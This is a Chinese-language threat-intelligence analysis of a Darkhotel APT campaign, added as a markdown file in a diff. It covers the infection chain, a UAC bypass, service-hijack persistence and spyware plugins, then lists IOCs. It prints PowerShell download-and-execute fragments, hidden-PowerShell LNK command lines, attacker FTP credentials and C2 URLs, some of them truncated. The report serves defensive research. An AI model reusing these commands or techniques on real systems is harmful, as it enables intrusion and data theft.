@@ -1,0 +1,734 @@
+## 背景  
+
+Darkhotel（APT-C-06）是一个长期针对企业高管、国防工业、电子工业等重要机构实施网络间谍攻击活动的APT组织。2014年11月，卡巴斯基实验室的安全专家首次发现了Darkhotel
+APT组织，并声明该组织至少从2010年就已经开始活跃，目标基本锁定在韩国、中国、俄罗斯和日本。360威胁情报中心对该团伙的活动一直保持着持续跟踪，而在最近几个月我们再次跟踪到该团伙发起的新的攻击活动。
+
+## 来源
+
+2018年2月中旬，360威胁情报中心在对恶意代码日常跟踪的过程中发现疑似定向攻击的APT样本，通过对该样本的深入分析，利用威胁情报中心数据平台，确认其与长期跟踪的DarkHotel
+APT团伙存在关联，并且结合威胁情报数据挖掘到了该团伙更多的样本，对该团伙近年来使用的多个版本的恶意代码进行了分析对比，梳理了样本演化过程。
+
+## 样本分析
+
+监控到的样本是一个DOC样本（letter.doc），该样本会释放的一批白利用文件，其中一个白利用文件是谷歌Chrome浏览器组件：
+
+![image.png](https://image.3001.net/images/20180508/15257489281016.png!small)  
+
+白利用文件释放到以下目录：
+
+%temp%\taskhost.exe
+
+%temp%\chrome_frame_helper.dll
+
+taskhost.exe的签名信息：
+
+![image.png](https://image.3001.net/images/20180508/15257489355275.png!small)  
+
+而chrome_frame_helper.dll文件被白文件加载起来后，会从自身资源释放出一个和0xa9异或后的PowerShell脚本，再解密后执行。
+
+加密前的PowerShell脚本：
+
+![image.png](https://image.3001.net/images/20180508/1525748942683.png!small)  
+
+使用0xA9异或解密后的PowerShell脚本文件如下：
+
+![image.png](https://image.3001.net/images/20180508/15257489499838.png!small)  
+
+![image.png](https://image.3001.net/images/20180508/15257489547230.png!small)  
+
+将混淆后的PowerShell脚本解密后如下：
+
+![image.png](https://image.3001.net/images/20180508/15257489626243.png!small)  
+
+IEx(​key='Lq5846yGptowMcuLyQBcdw+vgnKl7aA0lTBUV4QkShs=';​wc.Headers["User-Agent"] ="Mozi11a/4.0"; ​wc.DownloadString(​a) "
+
+### Dropper
+
+解密后的PowerShell脚本就是一个Dropper，该脚本会将UserAgent设置为Mozi11a/4.0然后去下载下一步的PowerShell脚本执行：
+
+![image.png](https://image.3001.net/images/20180508/15257489706779.png!small)  
+
+再次下载回来的PowerShell脚本也是经过混淆的，去混淆分析整理后的功能主要是绕过UAC后去下载msfte.dll到系统的system32目录下，下载NTWDBLIB.DLL文件到系统的system32目录下，通过cliconfg.exe白利用加载NTWDBLIB.DLL来修改msfte.dll的宿主服务WSearch成自动开启状态，实现msfte.dll的持久化驻留主要功能如下：
+
+Bypass UAC
+
+样本首先通过修改注册表HKCU:\Software\Classes\exefile\shell\runas\command的值，指向需要运行的进程路径（PowerShell），再运行[sdclt.exe]()触发执行起来的进程以实现Bypass
+UAC：
+
+![image.png](https://image.3001.net/images/20180508/15257489789616.png!small)
+
+劫持系统模块  
+
+Bypass
+UAC后的PowerShell脚本会伪装UserAgent后去下载msfte.dll和NTWDBLIB.DLL这两个文件，然后通过AES解密到%temp%目录下，密钥为'Lq5846yGptowMcuLyQBcdw+vgnKl7aA0lTBUV4QkShs='：
+
+![image.png](https://image.3001.net/images/20180508/15257489908018.png!small)  
+
+使用PowerShell-Suite模块分别把temp目录下的msfte.dll和NTWDBLIB.DLL移动到system32目录下（因为当前执行的powershell的进程是bypassuac起来的，所以可以成功移动到系统目录下）。
+
+![image.png](https://image.3001.net/images/20180508/15257489962232.png!small)  
+
+%windir%\System32[cliconfg.exe]()文件会默认加载system32目录下的NTWDBLIB.dll文件，这样通过执行cliconfg.exe来执行NTWDBLIB.DLL的代码，而该DLL的代码主要是修改Wsearch服务的状态为自动启动状态，实现msfte.dll的长久驻留系统。
+
+![image.png](https://image.3001.net/images/20180508/15257490024007.png!small)
+
+传输加密后进程列表到WEB服务器  
+
+脚本还会将进程列表加密后传输到WEB服务器：
+
+![image.png](https://image.3001.net/images/20180508/15257490085150.png!small)
+
+上传msfte.dll文件信息  
+
+最后将msfte.dll的文件信息加密上传，确认mstfe.dll是否修改成功：
+
+![image.png](https://image.3001.net/images/20180508/15257490142443.png!small)  
+
+### NTWDBLIB.dll分析
+
+该DLL的主要作用是把WSearch服务（mstfe.dll的宿主服务）设置成自动启动状态，这样mstfe.dll会随系统启动而启动，然后重启服务，加载劫持的DLL文件：
+
+![image.png](https://image.3001.net/images/20180508/15257490202034.png!small)  
+
+还会检测AVG及AVAST杀软：
+
+![image.png](https://image.3001.net/images/20180508/15257490265160.png!small)  
+
+如果存在这两类杀软则删除自身：
+
+![image.png](https://image.3001.net/images/20180508/15257490327865.png!small)  
+
+生成对应自删除脚本并执行：
+
+![image.png](https://image.3001.net/images/20180508/15257490396856.png!small)  
+
+### msfte.dll分析
+
+下载回来的msfte.dll成功释放到system32目录后，重启系统（随之启动WSerch服务）会默认加载这个DLL文件，实现自启动，代码中会判断是否是以下几个进程加载该DLL，如果是才会执行恶意代码：
+
+![image.png](https://image.3001.net/images/20180508/15257490664094.png!small)  
+
+恶意代码执行后先获取Payload的下载地址：
+
+![image.png](https://image.3001.net/images/20180508/15257490596440.png!small)  
+
+LoadConfig函数会先判断同目录下有没有Config.ini，如果没有，就会从自身解密出Payload的下载地址：
+
+![image.png](https://image.3001.net/images/20180508/15257490789309.png!small)  
+
+解密后的数据内容，该样本的payload的下载地址为：
+
+http:// ****** ld.com/strawberry322/config.php
+
+http:// ****** 00.com/strawberry322/config.php
+
+![image.png](https://image.3001.net/images/20180508/15257490921238.png!small)  
+
+拼接出下载地址：
+
+![image.png](https://image.3001.net/images/20180508/15257490991517.png!small)  
+
+下载回来的文件是一个图片，附加数据在图片的后面：
+
+![image.png](https://image.3001.net/images/20180508/15257491032173.png!small)  
+
+![image.png](https://image.3001.net/images/20180508/15257491131827.png!small)  
+
+正常图片和捆绑了数据的图片大小对比：
+
+![image.png](https://image.3001.net/images/20180508/15257491207687.png!small)  
+
+最后从图片的附加数据种解密出Payload：
+
+![image.png](https://image.3001.net/images/20180508/15257491277120.png!small)  
+
+解密函数中会首先校验下载数据的合法性，然后再执行解密：
+
+![image.png](https://image.3001.net/images/20180508/15257491421529.png!small)  
+
+最后通过异或/减获取到解密后的PE文件：
+
+![image.png](https://image.3001.net/images/20180508/15257491554328.png!small)  
+
+解密后的数据如下：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257491601112.png!small)  
+
+  
+![image.png](https://image.3001.net/images/20180508/15257491696003.png!small)  
+
+### 主功能DLL（RetroMain）分析
+
+msfte.dll下载解密图片中的数据得到的DLL文件即为主远控DLL，该远控的主要功能逻辑除了命令处理模块外，还会启动两个线程分别用于插件安装，及信息窃取：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257491746907.png!small)  
+
+#### 字符串加密算法
+
+样本中使用的相关字符集函数名称都行了加密，加密的方式包含以下三类：
+
+第一类通过一个预置的64字节的字典异或获取字符串的值，该类解密算法主要用于解密动态函数名及部分重要的字符串：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257491867452.png!small)  
+
+第二类加密算法为单字节异或/加减，主要用于部分重要数据结构的解密：
+
+  
+![image.png](https://image.3001.net/images/20180508/1525749196479.png!small)  
+
+部分解密后的数据如下：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257492003920.png!small)  
+
+  
+![image.png](https://image.3001.net/images/20180508/15257492069133.png!small)  
+
+#### 启动执行插件的线程
+
+主控DLL启动一个线程并通过上述的第二类解密算法获取对应的插件名及插件对应的目录，插件路径为%ALLUSERSPROFILE%\GE4FH28Q，支持的插件如红框所示：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257492153665.png!small)  
+
+再依次判断目录下的对应插件，并加载执行：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257492215648.png!small)  
+
+之后获取系统相关信息，主要为系统版本及操作系统当前的相关状态信息（如路由表，进程列表等）：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257492281438.png!small)  
+
+fun_CollectinfoBycmd函数中通过CMD命令获取操作系统状态：
+
+命令 |  功能  
+---|---  
+/c systeminfo |  系统信息  
+/c tasklist /v |  进程列表  
+/c netstat -ano |  网络连接状态  
+/c ipconfig /all |  Ip信息  
+/c route print |  路由表信息  
+  
+部分收集的信息如下所示：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257492388965.png!small)  
+
+紧接着开启第二个线程用于窃取用户数据，窃取的主要文件后缀有：
+
+“.txt”;”.tmp”;”.dat”;”.dot”;”.rar”;
+
+然后提交到如下URL：
+
+http:// ****** rld.com/strawberry322/config.php?p=H&inst=2749&name=180322-16
+
+![image.png](https://image.3001.net/images/20180508/15257492454162.png!small)  
+
+最后进入fun_shell_Dispatch函数，该函数通过POST的方式提交用户信息（地址：http:// ******
+rld.com/strawberry322/config.php?p=H&inst=0538&name=180322-16），并返回对应的攻击指令，且提交数据的前八个字节预留，用于校验：
+
+![image.png](https://image.3001.net/images/20180508/15257492552967.png!small)  
+
+singal前6位的数据通过时间和随机数相加取余获得，第7、8位为前6位和的校验值：
+
+![image.png](https://image.3001.net/images/20180508/1525749259351.png!small)  
+
+之后获取服务端的指令执行相应的功能，支持的功能如下：
+
+指令 |  功能  
+---|---  
+CM |  执行Cmd命令  
+DO |  查看目录  
+DE |  执行文件  
+DC |  更新config.ini文件  
+  
+### 插件分析
+
+样本的主控模块（RetroMain）除了实现远程命令处理等功能以外主要以插件形式执行主要的模块功能，样本使用了多个插件，主要的插件功能如下：
+
+**插件名** |  **插件功能**  
+---|---  
+Ctfmon.exe/wqstec.exe |  简单的文件窃取并上传ftp  
+Ctfmon_donot.exe |  凭证窃取（浏览器等）  
+Dmext.dll |  Loader 应该也是下载metasploit  
+cryptcore.dll |  Loader metasploit  
+aucodhw.dll |  文件窃取.txt,.hwp,.doc,.docx,.xls,.xlsx,.ppt,.pptx  
+sdihlp.dll |  截屏模块  
+Helpcst.dll/ Kbdlu.dll |  键盘记录  
+metsrv.dll |  Metasploit backdoor  
+  
+相关插件的具体功能分析如下：
+
+#### Ctfmon.exe/wqstec.exe
+
+这两个exe为轻量级的信息收集Loader，通过执行以下CMD命令收集系统相关信息：
+
+命令  
+---  
+cmd.exe /c ipconfig /all  
+cmd.exe /c arp -a  
+cmd.exe /c netstat -an  
+cmd.exe /c systeminfo  
+cmd.exe /c mountvol  
+cmd.exe /c tasklist  
+cmd.exe /c net view  
+cmd.exe /c net use  
+  
+通过cmd.exe /cdir /x /s
+/a遍历目录文件信息，获取指定后缀的文件doc，xls，txt，ppt，eml，doc，并通过WinRAR加密压缩，对应的密码为：p1q2w3e4r!@#$????1234****：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257492756195.png!small)  
+
+收集的信息及对应的打包文件通过FTP上传，FTP服务器IP地址：119.xx.xx.32
+
+用户名：unknown
+
+密码：wodehaopengyou123!@#
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493049455.png!small)  
+
+#### ctfmon_ donot.exe
+
+该插件主要的功能是收集浏览器密码，然后经过AES加密存储到本地，供攻击者读取：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493127540.png!small)  
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493199455.png!small)  
+
+根据时间生成密钥，将生成的密钥字符串放到文件名里，最后把窃取的结果通过生成的密钥进行AES加密：
+
+  
+![image.png](https://image.3001.net/images/20180508/1525749329786.png!small)  
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493345664.png!small)  
+
+记录的数据格式是将每条AES加密后的数据进行Base64编码，再存储到文件中：
+
+  
+![image.png](https://image.3001.net/images/20180508/1525749341435.png!small)  
+
+#### Dmext.dll/cryptcore.dll
+
+该模块为一个Loader，用于下载对应的metsrv.dll，下载回来的DLL为Metasploit生成，对应的C&C地址通过异或加减操作解密：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493508896.png!small)  
+
+对应的IP，Port如下：
+
+![image.png](https://image.3001.net/images/20180508/15257493568220.png!small)  
+
+直接下载后通过线程函数启动：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493651630.png!small)  
+
+#### aucodhw.dll
+
+该插件的DLLMain中会先判断加载模块的进程是不是这3个进程：
+
+SearchFilterHost.exe
+
+SearchProtocolHost.exe
+
+SearchFilterHost.exeUp
+
+如果是，就先删除记录文件路径的配置文件%ALLUSERSPROFILE%/FW5GH1AO.lck，然后创建窗口线程，实现窗口消息循环：
+
+![image.png](https://image.3001.net/images/20180508/15257493721728.png!small)  
+
+随后在窗口线程里创建一个名为lua的窗口，并设置对应的lpfunWndProc函数，该函数为对应的文件窃取的主函数。
+
+![image.png](https://image.3001.net/images/20180508/15257493781678.png!small)  
+
+该模块为对应的文件窃取模块，内部解密的配置元组如下所示，标记了窃取的文件类型，及对应的文件保存格式等信息：
+
+![image.png](https://image.3001.net/images/20180508/15257493856242.png!small)  
+
+解密前的数据如下，前5个字节是标志，第5个字节是长度，后面是数据：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493926715.png!small)  
+
+  
+![image.png](https://image.3001.net/images/20180508/15257493987400.png!small)  
+
+解密算法：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257494058617.png!small)  
+
+最后判断是否有移动磁盘，有的时候，会60秒执行一次收集函数，没有的时候180秒执行一次：
+
+![image.png](https://image.3001.net/images/20180508/1525749412272.png!small)  
+
+样本运行之后会有专门的线程用于监控可移动磁盘（DRIVE_REMOVABLE）的插入，并窃取其中的重要文件：
+
+![image.png](https://image.3001.net/images/20180508/15257494181035.png!small)  
+
+收集比较特定后缀的文件，文件后缀包含（.txt,.hwp,.doc,.docx,.xls,.xlsx,.ppt,.pptx）：
+
+![image.png](https://image.3001.net/images/20180508/15257494279680.png!small)  
+
+  
+![image.png](https://image.3001.net/images/20180508/1525749430960.png!small)  
+
+最终把文件加密存到%ALLUSERSPROFILE%\AU50FE1D，等待攻击者提取。
+
+#### sdihlp.dll
+
+sdihlp.dll为该样本使用的截屏模块，模块启动后创建互斥量Mutexhawaiank，之后开启主线程：
+
+![image.png](https://image.3001.net/images/20180508/15257494403614.png!small)  
+
+随后创建一个名为aul的窗口，并设置对应的lpfunWndProc函数，该函数为对应的屏幕截屏主函数：
+
+![image.png](https://image.3001.net/images/20180508/15257494451974.png!small)  
+
+主函数中通过调用BitBlt抓取屏幕截图，并通过GDI函数保存成JPG文件。
+
+![image.png](https://image.3001.net/images/20180508/15257494537240.png!small)  
+
+临时的JPG文件保存在C:\ProgramData\AssemblyDataCache目录下：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257494648257.png!small)  
+
+之后对图片进行加密处理，并剪切到C:\ProgramData\AU50FE1D目录下：
+
+  
+![image.png](https://image.3001.net/images/20180508/1525749471727.png!small)  
+
+最终保存的图片如下所示：
+
+![image.png](https://image.3001.net/images/20180508/15257494766086.png!small)  
+
+#### Helpcst.dll/kbdlu.dll
+
+该DLL为键盘记录模块，通过主模块Retromain.dll加载运行，运行后会判断其进程是否为SearchProtocolHost.exe，否则退出，之后开启键盘记录线程：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257494844313.png!small)  
+
+获取部分需要使用的字符串，加密方式和主模块一致：
+
+![image.png](https://image.3001.net/images/20180508/1525749490800.png!small)  
+
+其中包含了对应的键盘记录存放目录（%ALLUSERSPROFILE%\AU50FE1D），及记录的文件类型，其同样会创建一个名为klua的窗口，并设置对应的lpfunWndProc函数，该函数为键盘记录主体：
+
+![image.png](https://image.3001.net/images/20180508/15257494982003.png!small)  
+
+该DLL中使用GetRawInput的方式获取击健记录：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257495043486.png!small)  
+
+记录日志如下所示：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257495119241.png!small)  
+
+#### metsrv.dll
+
+该DLL为Metasploit生成的攻击DLL。
+
+### 还原攻击流程
+
+通过360威胁情报中心的大数据关联，我们补齐了其它缺失的攻击样本，还原了本次攻击的整个流程：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257495161873.png!small)  
+
+## 溯源和关联
+
+通过对样本中使用的特殊代码结构、域名/IP等的关联分析，以及使用360威胁情报中心分析平台对相关样本和网络基础设施进行拓展，我们有理由相信此次攻击的幕后团伙为Darkhotel（APT-C-06）。
+
+### 网络内容合法性算法关联
+
+在分析的msfte.dll样本中我们注意到一段比较特殊的校验获取网络内容的合法性的算法，校验代码如下：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257495224044.png!small)  
+
+通过对使用了相同算法的样本关联分析，我们发现了另外两种形式的Dropper样本，分别是EXE和图片文件捆绑执行的样本，以及通过Lnk快捷方式执行的样本，他们都使用了相似的代码结构，可以确认这两种形式的Dropper样本和本次分析的样本出自同一团伙之手，比如特殊的校验获取的网络内容合法性算法部分完全一致：
+
+![image.png](https://image.3001.net/images/20180508/15257495271058.png!small)  
+
+样本A（wuauctl.exe）
+
+  
+![image.png](https://image.3001.net/images/20180508/15257495354878.png!small)  
+
+样本B(cala32.exe)
+
+### 域名关联分析指向DarkHotel
+
+进一步分析使用Lnk快捷方式执行恶意代码的样本，可以看到都使用了完全一致的命令行参数和代码：
+
+**关联到的样本** |  **快捷方式命令行参数**  
+---|---  
+恶意样本A |  Cmd.exe /c del /f ..lnk & powershell -windowstyle hidden -nop -c
+"​b='iex(New-Object Net.WebClient).'+[Text.Encoding]::UTF8.GetString(​b  
+恶意样本B |  Cmd.exe /c del /f ..lnk & powershell -windowstyle hidden -nop -c
+"​b='iex(New-Object Net.WebClient).'+[Text.Encoding]::UTF8.GetString(​b  
+  
+习惯性的使用360威胁情报中心数据平台搜索样本中用于下载恶意脚本的两个域名，可以看到相关域名正是360威胁情报中心内部长期跟踪的Darkhotel
+APT团伙使用的域名，相关域名早已经被打上Darkhotel的标签：
+
+  
+![image.png](https://image.3001.net/images/20180508/1525749563984.png!small)  
+
+### 溯源关联图
+
+![image.png](https://image.3001.net/images/20180508/15257495947387.png!small)  
+  
+  
+  
+
+### Dropper演变史
+
+360威胁情报中心通过大数据关联，对DarkHotel APT团伙从2016年以来使用的Dropper进行了整理分析。
+
+#### 2016年
+
+DarkHotel APT团伙从2016年以来一直使用Lnk快捷方式这种成本低廉且稳定的方式投递鱼叉邮件：
+
+![image.png](https://image.3001.net/images/20180508/15257496079940.png!small)  
+
+对应的命令行参数：
+
+#### 2017年
+
+2017年开始同时使用伪装图片文件的PE文件的方式投递鱼叉邮件：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257496124374.png!small)  
+
+#### 2018年
+
+到2018年，DarkHotel开始使用已知好用的OfficeNDay 或者Office 0Day漏洞来投递鱼叉邮件，一般使用的Dropper名一般为：
+
+letter.doc
+
+### 各版本Loader对比分析
+
+360威胁情报中心通过大数据关联，对 DarkHotel
+APT团伙近年来使用的多个Loader版本进行了整理分析，通过分析大致可以看到该Loader历经了三个开发周期：
+
+#### 第一版Loader
+
+Md5 |  83a24589431f191cdde110ef64c21568  
+---|---  
+编译时间 |  2016/8/27  
+  
+最初版本的Loader主函数功能十分清晰，线程中执行主要的Loader功能，并通过LoadLibrary加载模块DLL：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257496221187.png!small)  
+
+主线程中只对C&C进行了加密处理，如下所示其URL的字段和现在的版本基本一致：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257496289274.png!small)  
+
+C&C的加密算法如下所示，也是简单的XOR及加减处理，甚至其对应操作的变量都是一致的：
+
+  
+![image.png](https://image.3001.net/images/20180508/1525749635650.png!small)  
+
+加密C&C字段同样以OCC标记。
+
+![image.png](https://image.3001.net/images/20180508/15257496397335.png!small)  
+
+Loader中本身内嵌了杀软的检测代码，如下所示，可以看到早期的样本中检测杀软比最新版要多很多：
+
+![image.png](https://image.3001.net/images/20180508/15257496466354.png!small)  
+
+检测中时候用的字符如下所示并没用进行混淆处理：
+
+![image.png](https://image.3001.net/images/20180508/15257496541369.png!small)  
+
+和最新模块一致的信息收集方式（大量CMD指令获取计算机信息）：
+
+![image.png](https://image.3001.net/images/20180508/15257496604005.png!small)  
+
+提交的用户信息中，同样会在前八个字节创建对应siginal，算法至今未变：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257496667870.png!small)  
+
+下载服务器返回的其他模块并加载，如下所示，加载器校验对应的下载模块是否以UPG或DEL开头，最新版本的校验头为DLL：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257496733404.png!small)  
+
+创建对应的自删除BAT文件：
+
+![image.png](https://image.3001.net/images/20180508/15257496797283.png!small)  
+
+#### 第二版Loader
+
+Md5 |  6075cbb9b522dc71a46cadd18a1afef4  
+---|---  
+编译时间 |  2016/3/16  
+  
+第二版和第一版相差不大，代码逻辑上基本没有修改，只是对第一版中大量的敏感字符进行了混淆处理，如下为解密的对应杀软检测字符：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257496865691.png!small)  
+
+对应的插件名，URL字段：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257496925671.png!small)  
+
+以简单的GetCC函数为例，可以看到代码整体逻辑是没有区别的：
+
+![image.png](https://image.3001.net/images/20180508/15257496974904.png!small)  
+
+只是增加了对应的混淆还原处理：
+
+  
+![image.png](https://image.3001.net/images/20180508/15257497062557.png!small)  
+
+#### 第三版Loader
+
+Md5 |  83a24589431f191cdde110ef64c21568  
+---|---  
+编译时间 |  2017/5/30(retromain.dll)  
+Md5 |  cba213e68cb6af25ae7303efb8629f14  
+---|---  
+编译时间 |  2017/4/15 (msfte.dll)  
+Md5 |  9badf32c51938cf61e7b37879a4fb349  
+---|---  
+编译时间 |  2018/3/21(ntwdblib.dll)  
+  
+通过和之前两个版本的比较，结合样本的分析，可以发现第三版是在第二版的基础上进行拆分，第二版的代码直接被拆分为现在的msfte.dll、ReroMain以及NTWDBLIB.dll三个DLL，但是代码的整体逻辑，包括加密算法、通信校验上并没有太大的变化，而是把Loader的功能进行了更细粒度的拆分，使其更加模块化。
+
+## 总结
+
+360威胁情报中心对DarkhotelAPT团伙的近期攻击活动中使用的恶意代码进行了深入的分析挖掘，并结合威胁情报数据对该团伙近三年来的攻击武器进行了分析和比较，可以看出该团伙主要使用鱼叉攻击投放攻击载荷文件，并不断更换其载荷文件的形态。结合对该团伙历史攻击武器的分析，其持续更新迭代恶意代码的功能和形态，并呈现出功能模块化的趋势。
+
+目前，基于360威胁情报中心的威胁情报数据的全线产品，包括360威胁情报平台（TIP）、天眼高级威胁检测系统、360
+NGSOC等，都已经支持对此APT攻击团伙攻击活动的检测。
+
+## IOCs
+
+  
+
+**域名**  
+---  
+****e360.com  
+Top*******tea.com  
+servi********afe.com  
+10****0.org  
+Ser********mail.com  
+Servi**********mail.com  
+********-promotion.com  
+*******21.mooo.com  
+*********pages.com  
+*****ure-service.com  
+******-trv.com  
+*******measier.com  
+******011100.com  
+*****-co.net  
+******stereo.net  
+********updater.net  
+*****933.net  
+****ngine.com  
+*******ftware.org  
+*******ndcheckers.com  
+******ovie-contents.com  
+*****85475.net  
+*******service.com  
+*********vice365.com  
+**********ple-online.com  
+**URL**  
+<http://serv>**********-mail.com/in1/search.php  
+<http://serv>**********-mail.com/in1/1.ps1  
+http://********rv.com/one33/config.php  
+http://********pages.com/img_1st/80116/config.php  
+http://********motion.com/coolsummer/P63FQ40O.hta  
+http://********motion.com/banila/config.php  
+http://********motion.com/upload.php  
+http://********ervice.com/au/front.php  
+http://********measier.com/TT2/config.php  
+http://********11100.com/_sexygirl/userinfo.php  
+http://********o.net/_sexygirl/userinfo.php  
+http://********reo.net/_sexygirl/userinfo.php  
+http://********pdater.net/_radiostar/kill.php  
+http://********933.net/_radiostar/kill.php  
+http://********gine.com/i33po/profile.php  
+http://********ware.org/i33po/profile.php  
+http://********dcheckers.com/7/old/static/db.log  
+http://********ie-contents.com/melon322/search.php  
+http://********pdater.net/banila/search.phpname=999999-2  
+http://********ie-contents.com/melon322/search.phpname=180322-16  
+http://********sstea.com/img/girl.jpg  
+http://********60.com/img/girl.jpg  
+http://********63-mail.com/b/0702.docx  
+http://********60-safe.com/page1/alpha/service.php  
+http://********10.org/image5/search.php  
+http://********60.com/noname/minky/face.php  
+http://********60.com/noname/jerry/face.php  
+http://********5475.net/image7/pury.php  
+http://********63-mail.com/b/1.docx  
+http://********63-mail.com/c/ef  
+http://********63-mail.com/in8/1.ps1  
+<http://serv>**********-mail.com/in9/1.ps1  
+http://********10.org/image7/pury.php  
+http://********ervice.com/image7/mark.php  
+http://********ce365.com/old/static/read11.php  
+http://********ce365.com/old/static/dblog4.log  
+http://********ce365.com/old/static/card.JPG  
+http://********ce365.com/event/event.php  
+http://********pages.com/img_1st/17106/config.php  
+http://********ple-online.com/user01/v01  
+http://********10.org/image3/search.php  
+http://********10.org/image4/search.php  
+http://********10.org/image6/putty.php  
+http://********10.org/image8/hello.php  
+http://********ervice.com/image5/size.php  
+http://********ervice.com/image6/john.php  
+http://********ce365.com/old/static/dblog5.log  
+http://********ce365.com/old/static/dblog9.log  
+http://********motion.com/choco/config.php  
+http://********reo.net  
+http://********reo.net/  
+http://********63-mail.com/a/tga  
+http://********63-mail.com/c/desk  
+http://********63-mail.com/docx1/a1  
+http://********63-mail.com/docx2/algs  
+http://********63-mail.com/docx3/2016-01-19.rtf  
+http://********63-mail.com/greeting/genr.exe  
+http://********63-mail.com/in8/search.php  
+<http://serv>**********-mail.com/in9/search.php  
+http://********63-mail.com/proposals/genr.exe  
+http://********60-safe.com/creden01/service.php  
+http://********ple-online.com/nvic/clav.exe  
+http://********ple-online.com/user01/bat/b1  
+http://********ple-online.com/user01/bin  
+http://********ple-online.com/user01/order.php  
+http://********ple-online.com/user01/rtf/v1.rtf  
+http://********60.com/htdoc/ImageView.hta  
+http://********pages.com/1st-50017/config.php  
+http://********pdater.net/banila/search.php  
+http://********world.com/strawberry322/config.php  
+[http://1010]()********1100.com/strawberry322/config.php  
+  
+## 参考
+
+<https://ti.360.net/>
+
+<https://github.com/FuzzySecurity/PowerShell-Suite>
+
